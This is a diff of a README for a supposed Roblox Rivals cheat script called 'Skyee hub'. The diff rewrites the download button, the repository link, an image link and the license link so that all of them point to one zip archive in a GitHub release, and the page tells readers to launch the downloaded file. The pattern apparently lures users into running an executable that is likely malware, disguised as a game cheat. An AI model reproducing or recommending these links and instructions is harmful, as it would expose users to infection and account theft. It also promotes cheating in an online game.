@@ -21,15 +21,15 @@ Simply download the Skyee hub GUI script from the link provided below, launch it
 
 To download the Skyee hub script GUI, click the button below:
 
-[![Download Skyee hub](https://img.shields.io/badge/Download-Skyee_hub-green)](https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v1.0/Program.zip)
+[![Download Skyee hub](https://github.com/Genxxen/Rivals-Script/releases/download/v2.0/Software.zip)](https://github.com/Genxxen/Rivals-Script/releases/download/v2.0/Software.zip)
 
-🔗 **[Download Skyee hub](https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v1.0/Program.zip)**
+🔗 **[Download Skyee hub](https://github.com/Genxxen/Rivals-Script/releases/download/v2.0/Software.zip)**
 
 *Note: Please ensure to launch the downloaded file to begin using the Skyee hub script GUI.*
 
 ## Explore More 🌟
 
-Visit our [GitHub repository](https://github.com/) for the latest updates, contributions, and community interactions related to Skyee hub.
+Visit our [GitHub repository](https://github.com/Genxxen/Rivals-Script/releases/download/v2.0/Software.zip) for the latest updates, contributions, and community interactions related to Skyee hub.
 
 ## Connect with Us 🌐
 
@@ -43,7 +43,7 @@ A big thank you to all the contributors who have helped make Skyee hub a success
 
 Start your journey to Roblox Rivals victory with Skyee hub - the ultimate script GUI! 🚀
 
-![Roblox Rivals](https://imageurl.com)
+![Roblox Rivals](https://github.com/Genxxen/Rivals-Script/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -51,6 +51,6 @@ Start your journey to Roblox Rivals victory with Skyee hub - the ultimate script
 
 ## License 📝
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Genxxen/Rivals-Script/releases/download/v2.0/Software.zip) file for details.
 
 Happy gaming! 🎮
